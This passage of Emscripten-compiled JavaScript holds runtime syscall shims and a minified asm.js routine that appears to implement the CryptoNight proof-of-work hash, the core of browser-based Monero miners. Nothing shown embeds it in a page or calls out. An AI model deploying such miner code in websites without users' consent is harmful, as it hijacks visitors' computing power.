                var dirstream = FS.getStream(dirfd);
                if (!dirstream) throw new FS.ErrnoError(ERRNO_CODES.EBADF);
                dir = dirstream.path
            }
            path = PATH.join2(dir, path)
        }
        return path
    }),
    doStat: (function(func, path, buf) {
        try {
            var stat = func(path)
        } catch (e) {
            if (e && e.node && PATH.normalize(path) !== PATH.normalize(FS.getPath(e.node))) {
                return -ERRNO_CODES.ENOTDIR
            }
            throw e
        }
        HEAP32[buf >> 2] = stat.dev;
        HEAP32[buf + 4 >> 2] = 0;
        HEAP32[buf + 8 >> 2] = stat.ino;
        HEAP32[buf + 12 >> 2] = stat.mode;
        HEAP32[buf + 16 >> 2] = stat.nlink;
        HEAP32[buf + 20 >> 2] = stat.uid;
        HEAP32[buf + 24 >> 2] = stat.gid;
        HEAP32[buf + 28 >> 2] = stat.rdev;
        HEAP32[buf + 32 >> 2] = 0;
        HEAP32[buf + 36 >> 2] = stat.size;
        HEAP32[buf + 40 >> 2] = 4096;
        HEAP32[buf + 44 >> 2] = stat.blocks;
        HEAP32[buf + 48 >> 2] = stat.atime.getTime() / 1e3 | 0;
        HEAP32[buf + 52 >> 2] = 0;
        HEAP32[buf + 56 >> 2] = stat.mtime.getTime() / 1e3 | 0;
        HEAP32[buf + 60 >> 2] = 0;
        HEAP32[buf + 64 >> 2] = stat.ctime.getTime() / 1e3 | 0;
        HEAP32[buf + 68 >> 2] = 0;
        HEAP32[buf + 72 >> 2] = stat.ino;
        return 0
    }),
    doMsync: (function(addr, stream, len, flags) {
        var buffer = new Uint8Array(HEAPU8.subarray(addr, addr + len));
        FS.msync(stream, buffer, 0, len, flags)
    }),
    doMkdir: (function(path, mode) {
        path = PATH.normalize(path);
        if (path[path.length - 1] === "/") path = path.substr(0, path.length - 1);
        FS.mkdir(path, mode, 0);
        return 0
    }),
    doMknod: (function(path, mode, dev) {
        switch (mode & 61440) {
            case 32768:
            case 8192:
            case 24576:
            case 4096:
            case 49152:
                break;
            default:
                return -ERRNO_CODES.EINVAL
        }
        FS.mknod(path, mode, dev);
        return 0
    }),
    doReadlink: (function(path, buf, bufsize) {
        if (bufsize <= 0) return -ERRNO_CODES.EINVAL;
        var ret = FS.readlink(path);
        var len = Math.min(bufsize, lengthBytesUTF8(ret));
        var endChar = HEAP8[buf + len];
        stringToUTF8(ret, buf, bufsize + 1);
        HEAP8[buf + len] = endChar;
        return len
    }),
    doAccess: (function(path, amode) {
        if (amode & ~7) {
            return -ERRNO_CODES.EINVAL
        }
        var node;
        var lookup = FS.lookupPath(path, {
            follow: true
        });
        node = lookup.node;
        var perms = "";
        if (amode & 4) perms += "r";
        if (amode & 2) perms += "w";
        if (amode & 1) perms += "x";
        if (perms && FS.nodePermissions(node, perms)) {
            return -ERRNO_CODES.EACCES
        }
        return 0
    }),
    doDup: (function(path, flags, suggestFD) {
        var suggest = FS.getStream(suggestFD);
        if (suggest) FS.close(suggest);
        return FS.open(path, flags, 0, suggestFD, suggestFD).fd
    }),
    doReadv: (function(stream, iov, iovcnt, offset) {
        var ret = 0;
        for (var i = 0; i < iovcnt; i++) {
            var ptr = HEAP32[iov + i * 8 >> 2];
            var len = HEAP32[iov + (i * 8 + 4) >> 2];
            var curr = FS.read(stream, HEAP8, ptr, len, offset);
            if (curr < 0) return -1;
            ret += curr;
            if (curr < len) break
        }
        return ret
    }),
    doWritev: (function(stream, iov, iovcnt, offset) {
        var ret = 0;
        for (var i = 0; i < iovcnt; i++) {
            var ptr = HEAP32[iov + i * 8 >> 2];
            var len = HEAP32[iov + (i * 8 + 4) >> 2];
            var curr = FS.write(stream, HEAP8, ptr, len, offset);
            if (curr < 0) return -1;
            ret += curr
        }
        return ret
    }),
    varargs: 0,
    get: (function(varargs) {
        SYSCALLS.varargs += 4;
        var ret = HEAP32[SYSCALLS.varargs - 4 >> 2];
        return ret
    }),
    getStr: (function() {
        var ret = Pointer_stringify(SYSCALLS.get());
        return ret
    }),
    getStreamFromFD: (function() {
        var stream = FS.getStream(SYSCALLS.get());
        if (!stream) throw new FS.ErrnoError(ERRNO_CODES.EBADF);
        return stream
    }),
    getSocketFromFD: (function() {
        var socket = SOCKFS.getSocket(SYSCALLS.get());
        if (!socket) throw new FS.ErrnoError(ERRNO_CODES.EBADF);
        return socket
    }),
    getSocketAddress: (function(allowNull) {
        var addrp = SYSCALLS.get(),
            addrlen = SYSCALLS.get();
        if (allowNull && addrp === 0) return null;
        var info = __read_sockaddr(addrp, addrlen);
        if (info.errno) throw new FS.ErrnoError(info.errno);
        info.addr = DNS.lookup_addr(info.addr) || info.addr;
        return info
    }),
    get64: (function() {
        var low = SYSCALLS.get(),
            high = SYSCALLS.get();
        if (low >= 0) assert(high === 0);
        else assert(high === -1);
        return low
    }),
    getZero: (function() {
        assert(SYSCALLS.get() === 0)
    })
};

function ___syscall20(which, varargs) {
    SYSCALLS.varargs = varargs;
    try {
        return PROCINFO.pid
    } catch (e) {
        if (typeof FS === "undefined" || !(e instanceof FS.ErrnoError)) abort(e);
        return -e.errno
    }
}
var ___tm_current = STATICTOP;
STATICTOP += 48;
var ___tm_timezone = allocate(intArrayFromString("GMT"), "i8", ALLOC_STATIC);

function _gmtime_r(time, tmPtr) {
    var date = new Date(HEAP32[time >> 2] * 1e3);
    HEAP32[tmPtr >> 2] = date.getUTCSeconds();
    HEAP32[tmPtr + 4 >> 2] = date.getUTCMinutes();
    HEAP32[tmPtr + 8 >> 2] = date.getUTCHours();
    HEAP32[tmPtr + 12 >> 2] = date.getUTCDate();
    HEAP32[tmPtr + 16 >> 2] = date.getUTCMonth();
    HEAP32[tmPtr + 20 >> 2] = date.getUTCFullYear() - 1900;
    HEAP32[tmPtr + 24 >> 2] = date.getUTCDay();
    HEAP32[tmPtr + 36 >> 2] = 0;
    HEAP32[tmPtr + 32 >> 2] = 0;
    var start = Date.UTC(date.getUTCFullYear(), 0, 1, 0, 0, 0, 0);
    var yday = (date.getTime() - start) / (1e3 * 60 * 60 * 24) | 0;
    HEAP32[tmPtr + 28 >> 2] = yday;
    HEAP32[tmPtr + 40 >> 2] = ___tm_timezone;
    return tmPtr
}

function _gmtime(time) {
    return _gmtime_r(time, ___tm_current)
}

function ___lock() {}

function ___unlock() {}

function ___syscall6(which, varargs) {
    SYSCALLS.varargs = varargs;
    try {
        var stream = SYSCALLS.getStreamFromFD();
        FS.close(stream);
        return 0
    } catch (e) {
        if (typeof FS === "undefined" || !(e instanceof FS.ErrnoError)) abort(e);
        return -e.errno
    }
}

function ___assert_fail(condition, filename, line, func) {
    ABORT = true;
    throw "Assertion failed: " + Pointer_stringify(condition) + ", at: " + [filename ? Pointer_stringify(filename) : "unknown filename", line, func ? Pointer_stringify(func) : "unknown function"] + " at " + stackTrace()
}

function _emscripten_memcpy_big(dest, src, num) {
    HEAPU8.set(HEAPU8.subarray(src, src + num), dest);
    return dest
}

function _ftime(p) {
    var millis = Date.now();
    HEAP32[p >> 2] = millis / 1e3 | 0;
    HEAP16[p + 4 >> 1] = millis % 1e3;
    HEAP16[p + 6 >> 1] = 0;
    HEAP16[p + 8 >> 1] = 0;
    return 0
}

function ___syscall140(which, varargs) {
    SYSCALLS.varargs = varargs;
    try {
        var stream = SYSCALLS.getStreamFromFD(),
            offset_high = SYSCALLS.get(),
            offset_low = SYSCALLS.get(),
            result = SYSCALLS.get(),
            whence = SYSCALLS.get();
        var offset = offset_low;
        FS.llseek(stream, offset, whence);
        HEAP32[result >> 2] = stream.position;
        if (stream.getdents && offset === 0 && whence === 0) stream.getdents = null;
        return 0
    } catch (e) {
        if (typeof FS === "undefined" || !(e instanceof FS.ErrnoError)) abort(e);
        return -e.errno
    }
}

function ___syscall146(which, varargs) {
    SYSCALLS.varargs = varargs;
    try {
        var stream = SYSCALLS.getStreamFromFD(),
            iov = SYSCALLS.get(),
            iovcnt = SYSCALLS.get();
        return SYSCALLS.doWritev(stream, iov, iovcnt)
    } catch (e) {
        if (typeof FS === "undefined" || !(e instanceof FS.ErrnoError)) abort(e);
        return -e.errno
    }
}

function ___syscall54(which, varargs) {
    SYSCALLS.varargs = varargs;
    try {
        var stream = SYSCALLS.getStreamFromFD(),
            op = SYSCALLS.get();
        switch (op) {
            case 21505:
                {
                    if (!stream.tty) return -ERRNO_CODES.ENOTTY;
                    return 0
                };
            case 21506:
                {
                    if (!stream.tty) return -ERRNO_CODES.ENOTTY;
                    return 0
                };
            case 21519:
                {
                    if (!stream.tty) return -ERRNO_CODES.ENOTTY;
                    var argp = SYSCALLS.get();HEAP32[argp >> 2] = 0;
                    return 0
                };
            case 21520:
                {
                    if (!stream.tty) return -ERRNO_CODES.ENOTTY;
                    return -ERRNO_CODES.EINVAL
                };
            case 21531:
                {
                    var argp = SYSCALLS.get();
                    return FS.ioctl(stream, op, argp)
                };
            case 21523:
                {
                    if (!stream.tty) return -ERRNO_CODES.ENOTTY;
                    return 0
                };
            default:
                abort("bad ioctl syscall " + op)
        }
    } catch (e) {
        if (typeof FS === "undefined" || !(e instanceof FS.ErrnoError)) abort(e);
        return -e.errno
    }
}
FS.staticInit();
__ATINIT__.unshift((function() {
    if (!Module["noFSInit"] && !FS.init.initialized) FS.init()
}));
__ATMAIN__.push((function() {
    FS.ignorePermissions = false
}));
__ATEXIT__.push((function() {
    FS.quit()
}));
Module["FS_createFolder"] = FS.createFolder;
Module["FS_createPath"] = FS.createPath;
Module["FS_createDataFile"] = FS.createDataFile;
Module["FS_createPreloadedFile"] = FS.createPreloadedFile;
Module["FS_createLazyFile"] = FS.createLazyFile;
Module["FS_createLink"] = FS.createLink;
Module["FS_createDevice"] = FS.createDevice;
Module["FS_unlink"] = FS.unlink;
__ATINIT__.unshift((function() {
    TTY.init()
}));
__ATEXIT__.push((function() {
    TTY.shutdown()
}));
if (ENVIRONMENT_IS_NODE) {
    var fs = require("fs");
    var NODEJS_PATH = require("path");
    NODEFS.staticInit()
}
DYNAMICTOP_PTR = allocate(1, "i32", ALLOC_STATIC);
STACK_BASE = STACKTOP = Runtime.alignMemory(STATICTOP);
STACK_MAX = STACK_BASE + TOTAL_STACK;
DYNAMIC_BASE = Runtime.alignMemory(STACK_MAX);
HEAP32[DYNAMICTOP_PTR >> 2] = DYNAMIC_BASE;
staticSealed = true;

function invoke_ii(index, a1) {
    try {
        return Module["dynCall_ii"](index, a1)
    } catch (e) {
        if (typeof e !== "number" && e !== "longjmp") throw e;
        Module["setThrew"](1, 0)
    }
}

function invoke_iiii(index, a1, a2, a3) {
    try {
        return Module["dynCall_iiii"](index, a1, a2, a3)
    } catch (e) {
        if (typeof e !== "number" && e !== "longjmp") throw e;
        Module["setThrew"](1, 0)
    }
}

function invoke_viii(index, a1, a2, a3) {
    try {
        Module["dynCall_viii"](index, a1, a2, a3)
    } catch (e) {
        if (typeof e !== "number" && e !== "longjmp") throw e;
        Module["setThrew"](1, 0)
    }
}
Module.asmGlobalArg = {
    "Math": Math,
    "Int8Array": Int8Array,
    "Int16Array": Int16Array,
    "Int32Array": Int32Array,
    "Uint8Array": Uint8Array,
    "Uint16Array": Uint16Array,
    "Uint32Array": Uint32Array,
    "Float32Array": Float32Array,
    "Float64Array": Float64Array,
    "NaN": NaN,
    "Infinity": Infinity
};
Module.asmLibraryArg = {
    "abort": abort,
    "assert": assert,
    "enlargeMemory": enlargeMemory,
    "getTotalMemory": getTotalMemory,
    "abortOnCannotGrowMemory": abortOnCannotGrowMemory,
    "invoke_ii": invoke_ii,
    "invoke_iiii": invoke_iiii,
    "invoke_viii": invoke_viii,
    "_gmtime_r": _gmtime_r,
    "_gmtime": _gmtime,
    "___lock": ___lock,
    "___syscall6": ___syscall6,
    "___setErrNo": ___setErrNo,
    "___syscall140": ___syscall140,
    "___syscall146": ___syscall146,
    "_emscripten_memcpy_big": _emscripten_memcpy_big,
    "___syscall54": ___syscall54,
    "___unlock": ___unlock,
    "___syscall20": ___syscall20,
    "___assert_fail": ___assert_fail,
    "_ftime": _ftime,
    "DYNAMICTOP_PTR": DYNAMICTOP_PTR,
    "tempDoublePtr": tempDoublePtr,
    "ABORT": ABORT,
    "STACKTOP": STACKTOP,
    "STACK_MAX": STACK_MAX
}; // EMSCRIPTEN_START_ASM
var asm = (function(global, env, buffer) {
    "use asm";
    var a = new global.Int8Array(buffer);
    var b = new global.Int16Array(buffer);
    var c = new global.Int32Array(buffer);
    var d = new global.Uint8Array(buffer);
    var e = new global.Uint16Array(buffer);
    var f = new global.Uint32Array(buffer);
    var g = new global.Float32Array(buffer);
    var h = new global.Float64Array(buffer);
    var i = env.DYNAMICTOP_PTR | 0;
    var j = env.tempDoublePtr | 0;
    var k = env.ABORT | 0;
    var l = env.STACKTOP | 0;
    var m = env.STACK_MAX | 0;
    var n = 0;
    var o = 0;
    var p = 0;
    var q = 0;
    var r = global.NaN,
        s = global.Infinity;
    var t = 0,
        u = 0,
        v = 0,
        w = 0,
        x = 0.0;
    var y = 0;
    var z = global.Math.floor;
    var A = global.Math.abs;
    var B = global.Math.sqrt;
    var C = global.Math.pow;
    var D = global.Math.cos;
    var E = global.Math.sin;
    var F = global.Math.tan;
    var G = global.Math.acos;
    var H = global.Math.asin;
    var I = global.Math.atan;
    var J = global.Math.atan2;
    var K = global.Math.exp;
    var L = global.Math.log;
    var M = global.Math.ceil;
    var N = global.Math.imul;
    var O = global.Math.min;
    var P = global.Math.max;
    var Q = global.Math.clz32;
    var R = env.abort;
    var S = env.assert;
    var T = env.enlargeMemory;
    var U = env.getTotalMemory;
    var V = env.abortOnCannotGrowMemory;
    var W = env.invoke_ii;
    var X = env.invoke_iiii;
    var Y = env.invoke_viii;
    var Z = env._gmtime_r;
    var _ = env._gmtime;
    var $ = env.___lock;
    var aa = env.___syscall6;
    var ba = env.___setErrNo;
    var ca = env.___syscall140;
    var da = env.___syscall146;
    var ea = env._emscripten_memcpy_big;
    var fa = env.___syscall54;
    var ga = env.___unlock;
    var ha = env.___syscall20;
    var ia = env.___assert_fail;
    var ja = env._ftime;
    var ka = 0.0;
    // EMSCRIPTEN_START_FUNCS
    function oa(a) {
        a = a | 0;
        var b = 0;
        b = l;
        l = l + a | 0;
        l = l + 15 & -16;
        return b | 0
    }

    function pa() {
        return l | 0
    }

    function qa(a) {
        a = a | 0;
        l = a
    }

    function ra(a, b) {
        a = a | 0;
        b = b | 0;
        l = a;
        m = b
    }

    function sa(a, b) {
        a = a | 0;
        b = b | 0;
        if (!n) {
            n = a;
            o = b
        }
    }

    function ta(a) {
        a = a | 0;
        y = a
    }

    function ua() {
        return y | 0
    }

    function va(a, b, c) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        Ia(a, b << 3, 0, c);
        return
    }

    function wa() {
        return ab(1, 2097552) | 0
    }

    function xa(a) {
        a = a | 0;
        Ya(a + 2097536 | 0) | 0;
        $a(a);
        return
    }

    function ya(b, d, e, f) {
        b = b | 0;
        d = d | 0;
        e = e | 0;
        f = f | 0;
        var g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0,
            x = 0,
            z = 0,
            A = 0,
            B = 0,
            C = 0,
            D = 0,
            E = 0,
            F = 0,
            G = 0,
            H = 0,
            I = 0,
            J = 0,
            K = 0;
        C = l;
        l = l + 16 | 0;
        p = C;
        B = b + 2097152 | 0;
        Pa(d, f, B);
        A = b + 2097536 | 0;
        d = c[A >> 2] | 0;
        if (!d) {
            d = Wa() | 0;
            c[A >> 2] = d;
            o = A
        } else o = A;
        x = b + 2097360 | 0;
        z = b + 2097216 | 0;
        f = x;
        g = z;
        h = f + 128 | 0;
        do {
            c[f >> 2] = c[g >> 2];
            f = f + 4 | 0;
            g = g + 4 | 0
        } while ((f | 0) < (h | 0));
        Va(d, B, 32) | 0;
        q = b + 2097376 | 0;
        r = b + 2097392 | 0;
        s = b + 2097408 | 0;
        t = b + 2097424 | 0;
        u = b + 2097440 | 0;
        v = b + 2097456 | 0;
        w = b + 2097472 | 0;
        d = 0;
        do {
            Da(x, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            Da(q, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            Da(r, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            Da(s, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            Da(t, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            Da(u, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            Da(v, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            Da(w, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            f = b + d | 0;
            g = x;
            h = f + 128 | 0;
            do {
                a[f >> 0] = a[g >> 0] | 0;
                f = f + 1 | 0;
                g = g + 1 | 0
            } while ((f | 0) < (h | 0));
            d = d + 128 | 0
        } while (d >>> 0 < 2097152);
        n = b + 2097184 | 0;
        j = b + 2097488 | 0;
        D = B;
        g = n;
        f = c[g >> 2] ^ c[D >> 2];
        D = c[g + 4 >> 2] ^ c[D + 4 >> 2];
        g = j;
        c[g >> 2] = f;
        c[g + 4 >> 2] = D;
        g = b + 2097160 | 0;
        D = b + 2097192 | 0;
        i = c[D + 4 >> 2] ^ c[g + 4 >> 2];
        k = b + 2097496 | 0;
        m = k;
        c[m >> 2] = c[D >> 2] ^ c[g >> 2];
        c[m + 4 >> 2] = i;
        m = b + 2097504 | 0;
        i = b + 2097168 | 0;
        g = b + 2097200 | 0;
        D = c[g + 4 >> 2] ^ c[i + 4 >> 2];
        d = m;
        c[d >> 2] = c[g >> 2] ^ c[i >> 2];
        c[d + 4 >> 2] = D;
        d = b + 2097176 | 0;
        D = b + 2097208 | 0;
        i = c[D + 4 >> 2] ^ c[d + 4 >> 2];
        g = b + 2097512 | 0;
        h = g;
        c[h >> 2] = c[D >> 2] ^ c[d >> 2];
        c[h + 4 >> 2] = i;
        h = b + 2097520 | 0;
        i = b + 2097528 | 0;
        d = 0;
        while (1) {
            H = b + (f & 2097136) | 0;
            Ca(H, h, j);
            f = h;
            E = m;
            J = c[E + 4 >> 2] ^ c[f + 4 >> 2];
            G = H;
            c[G >> 2] = c[E >> 2] ^ c[f >> 2];
            c[G + 4 >> 2] = J;
            G = i;
            J = g;
            f = c[J + 4 >> 2] ^ c[G + 4 >> 2];
            H = H + 8 | 0;
            c[H >> 2] = c[J >> 2] ^ c[G >> 2];
            c[H + 4 >> 2] = f;
            H = b + (c[h >> 2] & 2097136) | 0;
            f = h;
            G = H;
            G = Za(c[f >> 2] | 0, c[f + 4 >> 2] | 0, c[G >> 2] | 0, c[G + 4 >> 2] | 0, p) | 0;
            f = k;
            G = wb(c[f >> 2] | 0, c[f + 4 >> 2] | 0, G | 0, y | 0) | 0;
            f = y;
            J = j;
            E = p;
            J = wb(c[E >> 2] | 0, c[E + 4 >> 2] | 0, c[J >> 2] | 0, c[J + 4 >> 2] | 0) | 0;
            E = y;
            D = H;
            I = c[D + 4 >> 2] ^ E;
            F = j;
            c[F >> 2] = c[D >> 2] ^ J;
            c[F + 4 >> 2] = I;
            F = H + 8 | 0;
            I = F;
            D = c[I + 4 >> 2] ^ f;
            K = k;
            c[K >> 2] = c[I >> 2] ^ G;
            c[K + 4 >> 2] = D;
            c[H >> 2] = J;
            c[H + 4 >> 2] = E;
            c[F >> 2] = G;
            c[F + 4 >> 2] = f;
            F = b + (c[j >> 2] & 2097136) | 0;
            Ca(F, m, j);
            f = m;
            G = h;
            H = c[G + 4 >> 2] ^ c[f + 4 >> 2];
            E = F;
            c[E >> 2] = c[G >> 2] ^ c[f >> 2];
            c[E + 4 >> 2] = H;
            E = g;
            H = i;
            f = c[H + 4 >> 2] ^ c[E + 4 >> 2];
            F = F + 8 | 0;
            c[F >> 2] = c[H >> 2] ^ c[E >> 2];
            c[F + 4 >> 2] = f;
            F = b + (c[m >> 2] & 2097136) | 0;
            f = m;
            E = F;
            E = Za(c[f >> 2] | 0, c[f + 4 >> 2] | 0, c[E >> 2] | 0, c[E + 4 >> 2] | 0, p) | 0;
            f = k;
            E = wb(c[f >> 2] | 0, c[f + 4 >> 2] | 0, E | 0, y | 0) | 0;
            f = y;
            H = j;
            G = p;
            H = wb(c[G >> 2] | 0, c[G + 4 >> 2] | 0, c[H >> 2] | 0, c[H + 4 >> 2] | 0) | 0;
            G = y;
            J = F;
            K = c[J + 4 >> 2] ^ G;
            D = j;
            c[D >> 2] = c[J >> 2] ^ H;
            c[D + 4 >> 2] = K;
            D = F + 8 | 0;
            K = D;
            J = c[K + 4 >> 2] ^ f;
            I = k;
            c[I >> 2] = c[K >> 2] ^ E;
            c[I + 4 >> 2] = J;
            c[F >> 2] = H;
            c[F + 4 >> 2] = G;
            c[D >> 2] = E;
            c[D + 4 >> 2] = f;
            d = d + 1 | 0;
            if ((d | 0) == 262144) break;
            f = c[j >> 2] | 0
        }
        f = x;
        g = z;
        h = f + 128 | 0;
        do {
            c[f >> 2] = c[g >> 2];
            f = f + 4 | 0;
            g = g + 4 | 0
        } while ((f | 0) < (h | 0));
        Va(c[o >> 2] | 0, n, 32) | 0;
        f = b + 2097368 | 0;
        g = b + 2097384 | 0;
        h = b + 2097400 | 0;
        i = b + 2097416 | 0;
        j = b + 2097432 | 0;
        k = b + 2097448 | 0;
        m = b + 2097464 | 0;
        n = b + 2097480 | 0;
        d = 0;
        do {
            H = b + d | 0;
            G = H;
            J = x;
            I = c[J + 4 >> 2] ^ c[G + 4 >> 2];
            K = x;
            c[K >> 2] = c[J >> 2] ^ c[G >> 2];
            c[K + 4 >> 2] = I;
            H = H + 8 | 0;
            K = f;
            I = c[K + 4 >> 2] ^ c[H + 4 >> 2];
            G = f;
            c[G >> 2] = c[K >> 2] ^ c[H >> 2];
            c[G + 4 >> 2] = I;
            Da(x, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            G = b + (d | 16) | 0;
            I = G;
            H = q;
            K = c[H + 4 >> 2] ^ c[I + 4 >> 2];
            J = q;
            c[J >> 2] = c[H >> 2] ^ c[I >> 2];
            c[J + 4 >> 2] = K;
            G = G + 8 | 0;
            J = g;
            K = c[J + 4 >> 2] ^ c[G + 4 >> 2];
            I = g;
            c[I >> 2] = c[J >> 2] ^ c[G >> 2];
            c[I + 4 >> 2] = K;
            Da(q, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            I = b + (d | 32) | 0;
            K = I;
            G = r;
            J = c[G + 4 >> 2] ^ c[K + 4 >> 2];
            H = r;
            c[H >> 2] = c[G >> 2] ^ c[K >> 2];
            c[H + 4 >> 2] = J;
            I = I + 8 | 0;
            H = h;
            J = c[H + 4 >> 2] ^ c[I + 4 >> 2];
            K = h;
            c[K >> 2] = c[H >> 2] ^ c[I >> 2];
            c[K + 4 >> 2] = J;
            Da(r, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            K = b + (d | 48) | 0;
            J = K;
            I = s;
            H = c[I + 4 >> 2] ^ c[J + 4 >> 2];
            G = s;
            c[G >> 2] = c[I >> 2] ^ c[J >> 2];
            c[G + 4 >> 2] = H;
            K = K + 8 | 0;
            G = i;
            H = c[G + 4 >> 2] ^ c[K + 4 >> 2];
            J = i;
            c[J >> 2] = c[G >> 2] ^ c[K >> 2];
            c[J + 4 >> 2] = H;
            Da(s, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            J = b + (d | 64) | 0;
            H = J;
            K = t;
            G = c[K + 4 >> 2] ^ c[H + 4 >> 2];
            I = t;
            c[I >> 2] = c[K >> 2] ^ c[H >> 2];
            c[I + 4 >> 2] = G;
            J = J + 8 | 0;
            I = j;
            G = c[I + 4 >> 2] ^ c[J + 4 >> 2];
            H = j;
            c[H >> 2] = c[I >> 2] ^ c[J >> 2];
            c[H + 4 >> 2] = G;
            Da(t, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            H = b + (d | 80) | 0;
            G = H;
            J = u;
            I = c[J + 4 >> 2] ^ c[G + 4 >> 2];
            K = u;
            c[K >> 2] = c[J >> 2] ^ c[G >> 2];
            c[K + 4 >> 2] = I;
            H = H + 8 | 0;
            K = k;
            I = c[K + 4 >> 2] ^ c[H + 4 >> 2];
            G = k;
            c[G >> 2] = c[K >> 2] ^ c[H >> 2];
            c[G + 4 >> 2] = I;
            Da(u, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            G = b + (d | 96) | 0;
            I = G;
            H = v;
            K = c[H + 4 >> 2] ^ c[I + 4 >> 2];
            J = v;
            c[J >> 2] = c[H >> 2] ^ c[I >> 2];
            c[J + 4 >> 2] = K;
            G = G + 8 | 0;
            J = m;
            K = c[J + 4 >> 2] ^ c[G + 4 >> 2];
            I = m;
            c[I >> 2] = c[J >> 2] ^ c[G >> 2];
            c[I + 4 >> 2] = K;
            Da(v, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            I = b + (d | 112) | 0;
            K = I;
            G = w;
            J = c[G + 4 >> 2] ^ c[K + 4 >> 2];
            H = w;
            c[H >> 2] = c[G >> 2] ^ c[K >> 2];
            c[H + 4 >> 2] = J;
            I = I + 8 | 0;
            H = n;
            J = c[H + 4 >> 2] ^ c[I + 4 >> 2];
            K = n;
            c[K >> 2] = c[H >> 2] ^ c[I >> 2];
            c[K + 4 >> 2] = J;
            Da(w, c[(c[c[A >> 2] >> 2] | 0) + 12 >> 2] | 0);
            d = d + 128 | 0
        } while (d >>> 0 < 2097152);
        f = z;
        g = x;
        h = f + 128 | 0;
        do {
            c[f >> 2] = c[g >> 2];
            f = f + 4 | 0;
            g = g + 4 | 0
        } while ((f | 0) < (h | 0));
        Oa(B, 24);
        na[c[4688 + ((a[B >> 0] & 3 & 255) << 2) >> 2] & 7](B, 200, e);
        l = C;
        return
    }

    function za(a, b, c) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        Ha(c, a, b, 0);
        return
    }

    function Aa(a, b, c) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        if (!(Ma(256, a, b << 3, 0, c) | 0)) return;
        else ia(7380, 7395, 43, 7425)
    }

    function Ba(a, b, c) {
        a = a | 0;
        b = b | 0;
        c = c | 0;
        if (!(Qa(256, a, b << 3, c) | 0)) return;
        else ia(7436, 7395, 48, 7457)
    }

    function Ca(a, b, d) {
        a = a | 0;
        b = b | 0;
        d = d | 0;
        var e = 0,
            f = 0,
            g = 0;
        f = a + 4 | 0;
        e = a + 8 | 0;
        g = a + 12 | 0;
        c[b >> 2] = c[16 + ((c[a >> 2] & 255) << 2) >> 2] ^ c[d >> 2] ^ c[1040 + (((c[f >> 2] | 0) >>> 8 & 255) << 2) >> 2] ^ c[2064 + (((c[e >> 2] | 0) >>> 16 & 255) << 2) >> 2] ^ c[3088 + ((c[g >> 2] | 0) >>> 24 << 2) >> 2];
        c[b + 4 >> 2] = c[16 + ((c[f >> 2] & 255) << 2) >> 2] ^ c[d + 4 >> 2] ^ c[1040 + (((c[e >> 2] | 0) >>> 8 & 255) << 2) >> 2] ^ c[2064 + (((c[g >> 2] | 0) >>> 16 & 255) << 2) >> 2] ^ c[3088 + ((c[a >> 2] | 0) >>> 24 << 2) >> 2];
        c[b + 8 >> 2] = c[16 + ((c[e >> 2] & 255) << 2) >> 2] ^ c[d + 8 >> 2] ^ c[1040 + (((c[g >> 2] | 0) >>> 8 & 255) << 2) >> 2] ^ c[2064 + (((c[a >> 2] | 0) >>> 16 & 255) << 2) >> 2] ^ c[3088 + ((c[f >> 2] | 0) >>> 24 << 2) >> 2];
        c[b + 12 >> 2] = c[16 + ((c[g >> 2] & 255) << 2) >> 2] ^ c[d + 12 >> 2] ^ c[1040 + (((c[a >> 2] | 0) >>> 8 & 255) << 2) >> 2] ^ c[2064 + (((c[f >> 2] | 0) >>> 16 & 255) << 2) >> 2] ^ c[3088 + ((c[e >> 2] | 0) >>> 24 << 2) >> 2];
        return
    }

    function Da(a, b) {
        a = a | 0;
        b = b | 0;
        var d = 0,
            e = 0,
            f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            l = 0,
            m = 0;
        l = c[a >> 2] | 0;
        j = a + 4 | 0;
        k = c[j >> 2] | 0;
        i = a + 8 | 0;
        e = c[i >> 2] | 0;
        d = a + 12 | 0;
        h = c[d >> 2] | 0;
        g = c[16 + ((l & 255) << 2) >> 2] ^ c[b >> 2] ^ c[1040 + ((k >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((e >>> 16 & 255) << 2) >> 2] ^ c[3088 + (h >>> 24 << 2) >> 2];
        f = c[16 + ((k & 255) << 2) >> 2] ^ c[b + 4 >> 2] ^ c[1040 + ((e >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((h >>> 16 & 255) << 2) >> 2] ^ c[3088 + (l >>> 24 << 2) >> 2];
        m = c[16 + ((e & 255) << 2) >> 2] ^ c[b + 8 >> 2] ^ c[1040 + ((h >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((l >>> 16 & 255) << 2) >> 2] ^ c[3088 + (k >>> 24 << 2) >> 2];
        e = c[16 + ((h & 255) << 2) >> 2] ^ c[b + 12 >> 2] ^ c[1040 + ((l >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((k >>> 16 & 255) << 2) >> 2] ^ c[3088 + (e >>> 24 << 2) >> 2];
        k = c[16 + ((g & 255) << 2) >> 2] ^ c[b + 16 >> 2] ^ c[1040 + ((f >>> 8 & 255) << 2) >> 2] ^ c[2064 + ((m >>> 16 & 255) << 2) >> 2] ^ c[3088 + (e >>> 24 << 2) >> 2];
        c[a >> 2] = k;
